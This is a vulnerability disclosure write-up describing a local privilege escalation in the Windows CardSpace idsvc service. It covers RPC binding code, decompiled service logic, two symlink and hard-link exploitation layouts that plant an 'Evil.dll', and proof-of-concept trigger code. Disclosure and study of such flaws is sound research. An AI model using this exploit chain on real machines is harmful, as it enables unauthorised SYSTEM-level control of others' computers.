# Windows 7 has a local privilege escalation vulnerability

```markdown
First, configure the environment variable [_NT_SYMBOL_PATH] with the following value:  
SRV*C:\symbols*http://msdl.microsoft.com/download/symbols/

Manually download symbols, symchk.exe is located in the windbg directory:  
```cmd
symchk.exe "C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\infocard.exe" /v
```

In RpcView tool, click Options -> Configure Symbols, and enter the following content (case-sensitive):  
```
srv*C:\symbols
```
![](https://github.com/xubeining/Cve_report/blob/main/OS1.png)

Use the tool to obtain three important data: the type of RPC protocol, the protocol name, and the client definition file of the protocol interface (compiled IDL-generated .c file, see the Decompilation textbox on the left). You can then bind the RPC service with the following method:

```cpp
BOOL StartRpcService()
{
	RPC_STATUS status;
	unsigned int cMinCalls = 1;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	if (StartConnectingService())
	{
		// RPC protocol type and name
		status = RpcStringBindingComposeW(nullptr, L"ncalrpc", 0, L"31336F38236F3E2C6F3F2E6F20336F20236F21326F", nullptr, &StringBinding);
		if (status){
			printf("RpcStringBindingComposeW Failed:%d\n", status);
			return(status);
		}
		status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
		RpcStringFreeW(&StringBinding);
		if (status){
			printf("RpcBindingFromStringBindingW Failed:%d\n", status);
			return(status);
		}
		SecurityQOS.Version = 1;
		SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
		SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
		SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
		status = RpcBindingSetAuthInfoExW(hBinding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
		if (status){
			printf("RpcBindingSetAuthInfoExW Failed:%d\n", status);
			return(status);
		}
		// Bind interface
		status = RpcEpResolveBinding(hBinding, DefaultIfName_v1_0_c_ifspec);
		if (status){
			printf("RpcEpResolveBinding Failed:%d\n", status);
			return(status);
		}
	}
	else
	{
		printf("Start Connecting Windows Cardspace Service Failed");
		return 0;
	}
	return 0;
}
```

Through reverse-engineering the idsvc service code, the actual project is revealed (see related project). The idsvc service binds a global handler for the global RPC interface `RequestFactory.ProcessNewRequest`. For the first call (when `parentRequestHandle` is 0), it calls the `CreateClientRequestInstance` class to handle the callback. Subsequent operations are handled by `CreateUIAgentRequestInstance`.

```csharp
// Global handler for the global RPC interface
internal static int ProcessNewRequest(int parentRequestHandle, IntPtr rpcHandle, IntPtr inArgs, out IntPtr outArgs)
{
	...
	// First call
	if (parentRequestHandle == 0)
	{
		using (UIAgentMonitorHandle monitorHandle = new UIAgentMonitorHandle())
		{
			using (ClientRequest clientRequestInstance = RequestFactory.CreateClientRequestInstance(monitorHandle, structure.Type, rpcHandle, inStream, (Stream)outStream))
			{
				string extendedMessage;
				// After reflection, execute the instance's DoProcessRequest method to handle the request
				num = clientRequestInstance.DoProcessRequest(out extendedMessage);
				RpcResponse outArgs1;
				RequestFactory.ConvertStreamToIntPtr(outStream, out outArgs1);
				// Return result
				outArgs = outArgs1.Marshal();		
			}
		}
	}
}
```

The idsvc service reflects out the corresponding class to handle the callback according to the class name in `RpcRequest->Type`. In the PoC, the `"ManageRequest"` class is used:

```csharp
private static ClientRequest CreateClientRequestInstance(UIAgentMonitorHandle monitorHandle, string reqName, IntPtr rpcHandle, Stream inStream, Stream outStream)
{
	ClientRequest clientRequest = (ClientRequest)null;
	lock (RequestFactory.s_createRequestSync)
	{
		RequestFactory.RequestName request = RequestFactory.s_requestMap[reqName];
		if (-1 != Array.IndexOf<RequestFactory.RequestName>(RequestFactory.s_uiClientRequests, request))
		{
			Process contextMapping = ClientUIRequest.GetContextMapping(rpcHandle, true);
			InfoCardTrace.ThrowInvalidArgumentConditional(null == contextMapping, nameof(rpcHandle));
			WindowsIdentity executionIdentity = NativeMcppMethods.CreateServiceExecutionIdentity(contextMapping);
			InfoCardUIAgent agent = monitorHandle.CreateAgent(contextMapping.Id, executionIdentity, tSSession);
			switch (RequestFactory.s_requestMap[reqName])
			{
				// Here, the "ManageRequest" class is used
				case RequestFactory.RequestName.ManageRequest:
					clientRequest = (ClientRequest)new ManageRequest(contextMapping, executionIdentity, agent, rpcHandle, inStream, outStream);
					break;
			}
		}
	}
}
```

The `DoProcessRequest` function of the `ManageRequest` instance is triggered to handle the request. Skipping intermediate steps, it finally calls `StoreConnection.CreateDefaultDataSources()` which becomes the exploitation point. During interaction with the service, the service impersonates the client and retrieves the user's configuration file, by default under the `%APPDATA%` directory. For IIS users, a special case where the configuration file is not loaded by default, this must be enabled via: Application Pool -> Advanced Settings.
![](https://github.com/xubeining/Cve_report/blob/main/OS3.png)

```csharp
// Constructor
protected StoreConnection(WindowsIdentity identity)
{
	// identity here is the client identity
	this.m_identity = new WindowsIdentity(identity.Token);
	// Get user's environment variable %APPDATA%
	this.m_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\CardSpace\\");
	this.m_localSource = this.m_path + "CardSpaceSP2.db";
}
```

```csharp
protected virtual void CreateDefaultDataSources(Hashtable list)
{
	string str = this.m_path + "CardSpace.db";
	// Within using block, the service identity is used; upon leaving the block, impersonate client continues
	using (new SystemIdentity(true))
	{
		...
		if (File.Exists(str))
		{
			// Replace file, internal implementation uses File.MoveTo, etc.
			this.AtomicFileCopy(str, this.m_localSource);
		}
	}
}
```

```csharp
protected void AtomicFileCopy(string source, string destination)
{
	if (!File.Exists(source))
		return;
	// Add .atomic suffix, move file
	File.Copy(source, source + ".atomic", true);
	FileInfo fileInfo = new FileInfo(source + ".atomic");
	if (fileInfo.Length == 0L)
		return;
	fileInfo.MoveTo(destination);
}
```

The idsvc service switches back to its own identity using `new SystemIdentity(true)` and moves the user's configuration file via `AtomicFileCopy`. Under default configuration, files in the `%APPDATA%` directory are fully controllable by the current user. When a high-privilege process performs delete, move, copy, or attribute operations on files controllable by a low-privilege process, the latter can exploit this privilege to perform various operations.

James Forshaw (@tiraniddo) provides an open-source toolkit. His pioneering work on NTFS and Windows internals has implemented several exploitation methods and techniques that abuse high-privileged processes' file operations. The NTFS file system allows one user-controlled directory to be mounted into another (Mount Points and Junctions), symbolic links to point one file/directory to another (Reparse Points), and hard links to link a user-controllable file to a readable one, all potentially enabling high-privilege abuse.

In this PoC, the following two exploitation methods are available:

**Method 1: Mount Points and Hard Links (Windows 7 only)**  
(Does not work on Windows 10 due to Microsoft mitigations)

```text
C:\workspace\mountpoint -> C:\Users\Username\AppData\Local\Microsoft\CardSpace
Source file (Mount Point) = C:\workspace\mountpoint\CardSpace.db (Fake.dll) -> C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db
Target file (Hard Link) = C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db.atomic -> C:\Evil.dll
```

**Method 2: Symbolic Links to \RPC Control (works on Windows 10)**

```text
C:\Users\Username\AppData\Local\Microsoft\CardSpace -> \RPC Control
Source file = C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db -> \RPC Control\CardSpace.db
Target file = C:\Users\Username\AppData\Local\Microsoft\CardSpace\CardSpace.db.atomic -> \RPC Control\CardSpace.db.atomic
Source file = \RPC Control\CardSpace.db -> C:\Fake.dll
Target file = \RPC Control\CardSpace.db.atomic -> C:\Evil.dll
```
![](https://github.com/xubeining/Cve_report/blob/main/OS3.png)

According to Process Monitor, idsvc does not use impersonation while moving files, nor does it check for symbolic link attributes, which leads to an arbitrary file replacement privilege escalation vulnerability.

The following is the key PoC code:

```cpp
BOOL Exploit()
{
	RpcRequest* req = (RpcRequest*)CoTaskMemAlloc(sizeof(RpcRequest));
	req->Type = L"ManageRequest";
	req->Length = 0;
	req->Data = 0;
	RpcResponse* rep = (RpcResponse*)CoTaskMemAlloc(sizeof(RpcResponse));
	UINT32* ctx = 0;
	long ret = Proc0_RPCClientBindToService(hBinding, (void**)&ctx);
	printf("Proc0_RPCClientBindToService :%d\n", ret);
	ret = Proc2_RPCDispatchClientUIRequest((void**)&ctx, req, &rep);
	printf("Proc2_RPCDispatchClientUIRequest :%08x\n", ret);
	return 0;
}
```
